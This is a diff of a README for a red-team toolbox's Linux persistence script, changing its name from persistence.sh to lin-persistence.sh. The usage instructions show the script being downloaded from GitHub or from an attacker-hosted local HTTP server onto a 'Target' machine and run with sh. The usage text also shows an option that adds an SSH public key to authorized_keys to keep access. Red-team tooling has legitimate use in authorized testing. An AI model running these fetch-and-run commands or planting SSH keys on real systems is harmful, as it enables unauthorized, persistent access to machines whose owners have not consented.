@@ -9,24 +9,24 @@ Available parts:
 
 ```sh
 # From github
-curl -LJO https://github.com/McSquizzy/red-team-toolbox/blob/main/persistence/persistence.sh
-sh persistence.sh -h
+curl -LJO https://github.com/McSquizzy/red-team-toolbox/blob/main/persistence/lin-persistence.sh
+sh lin-persistence.sh -h
 ```
 ```sh
 # Local network
 # Host:
 python -m SimpleHTTPServer 8000 #or
 python3 -m http.server 8000
-# Target
-curl -LJO <Host>:8000/persistence.sh
-sh persistence.sh -h
+# Target:
+curl -LJO <Host>:8000/lin-persistence.sh
+sh lin-persistence.sh -h
 ```
 
 ### Parameters
 ```sh
-sh persistence.sh -h
+sh lin-persistence.sh -h
 
-Usage: sh persistence.sh [-h] [-s]
+Usage: sh lin-persistence.sh [-h] [-s]
 
 -s <SSH public key>
   Trying to add ssh public key to authorized_keys
